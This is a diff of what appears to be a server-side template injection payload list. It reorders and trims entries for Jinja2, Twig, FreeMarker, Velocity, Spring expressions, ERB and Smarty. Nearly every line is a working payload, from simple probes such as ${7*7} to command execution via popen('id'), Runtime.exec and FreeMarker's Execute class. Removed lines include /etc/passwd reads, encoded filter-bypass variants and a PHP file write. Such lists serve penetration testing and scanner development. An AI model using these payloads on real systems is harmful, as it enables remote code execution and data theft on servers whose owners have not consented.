@@ -2,86 +2,43 @@
 ${7*7}
 #{7*7}
 *{7*7}
-<%=7*7%>
 {7*7}
+<%=7*7%>
 ${{7*7}}
 {{7*'7'}}
-${7*'7'}
-{{7*7}}{{7*7}}
-<%=7*7%>
-[[7*7]]
-{#7*7#}
+#set($x=7*7)${x}
+${.freemarker_version}
 @{7*7}
+[[7*7]]
 {{config}}
 {{config.items()}}
-{{settings}}
 {{self}}
-{{self.__dict__}}
 {{request}}
 {{request.environ}}
-{{request.application}}
 {{''.__class__.__mro__}}
 {{''.__class__.__mro__[1].__subclasses__()}}
-{{''.__class__.__mro__[2].__subclasses__()}}
-{{[].__class__.__mro__[1].__subclasses__()}}
-{{().__class__.__bases__[0].__subclasses__()}}
-{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
-{% set rce = request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() %}{{rce}}
 {{lipsum.__globals__.os.popen('id').read()}}
 {{lipsum.__globals__['os'].popen('id').read()}}
 {{cycler.__init__.__globals__.os.popen('id').read()}}
 {{joiner.__init__.__globals__.os.popen('id').read()}}
 {{namespace.__init__.__globals__.os.popen('id').read()}}
-{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)}}
-{{''|format('\x25s')|trim()}}
-{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')}}
-{{self._TemplateReference__context.config}}
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
 {{dump(app)}}
 {{app.request.server.all}}
-{{app.request.server.get('PHP_SELF')}}
 {{["id"]|map("system")}}
-{{["id",0]|sort("system")}}
-{{['id']|filter('system')}}
-{{{"<?php phpinfo()?>":"/var/www/html/test.php"}|map("file_put_contents")}}
+${"freemarker.template.utility.Execute"?new()("id")}
 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-<#assign classLoader=article.class.protectionDomain.classLoader><#assign owc=classLoader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.field("DEFAULT_WRAPPER").get(null)><#assign ec=classLoader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}
-#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
 T(java.lang.Runtime).getRuntime().exec('id')
-T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(org.springframework.util.StringUtils).tokenizeToStringArray('id', ' ')).getInputStream())
-${T(java.lang.System).getenv()}
+T(java.lang.System).getenv()
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 #{T(java.lang.Runtime).getRuntime().exec('id')}
 *{T(java.lang.Runtime).getRuntime().exec('id')}
-${"freemarker.template.utility.Execute"?new()("id")}
 <%=`id`%>
-<%= system("id") %>
-<%= `id` %>
-<%= IO.popen("id").read %>
-<%= eval("IO.popen('id').read") %>
+<%= system('id') %>
+<%= IO.popen('id').read %>
 {php}echo `id`;{/php}
 {system('id')}
 {php}echo system('id');{/php}
-{{''|pprint}}
-{{7|pprint}}
-{{config|pprint}}
-{{self|pprint}}
-{{ ''.__class__ }}
-{{ ''.__class__.__mro__ }}
-${7*7}
-${7*7}aa
-${"freemarker.template.utility.Execute"?new()("id")}
